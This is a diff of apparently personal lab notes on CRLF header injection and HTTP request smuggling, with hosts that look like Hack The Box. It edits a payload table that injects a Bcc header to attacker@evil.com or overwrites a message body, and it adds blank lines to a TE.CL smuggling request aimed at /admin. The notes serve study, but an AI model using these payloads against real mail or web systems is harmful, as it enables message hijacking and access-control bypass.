@@ -20,10 +20,10 @@ In the `Location:` header — use a **leading space or null data** before CRLF t
 
 > [!warning] Always inject a dummy header after your payload so any trailing data doesn't corrupt it.
 
-|Goal|Payload|
-|---|---|
-|Add CC/BCC|`victim@mail.com%0d%0aBcc:attacker@evil.com`|
-|Overwrite Body|`...%0d%0a%0d%0aNew Message Body Here`|
+| Goal           | Payload                                               |
+| -------------- | ----------------------------------------------------- |
+| Add CC/BCC     | `victim@mail.com%0d%0aBcc:attacker@evil.com%0d%0aBB:` |
+| Overwrite Body | `...%0d%0a%0d%0aNew Message Body Here`                |
 
 ---
 
@@ -42,7 +42,7 @@ In the `Location:` header — use a **leading space or null data** before CRLF t
 ---
 
 ### CL.TE — Example
-
+DONT FORGET NOT TO ADD AND NEW LINES AFTER THE DUMMY HEADER
 ```http
 POST / HTTP/1.1
 Host: clte.htb
@@ -66,10 +66,13 @@ Content-Length: 4
 Transfer-Encoding: chunked
 
 27
+
 GET /admin HTTP/1.1
 Host: tecl.htb
 
 0
+
+
 ```
 
 ---
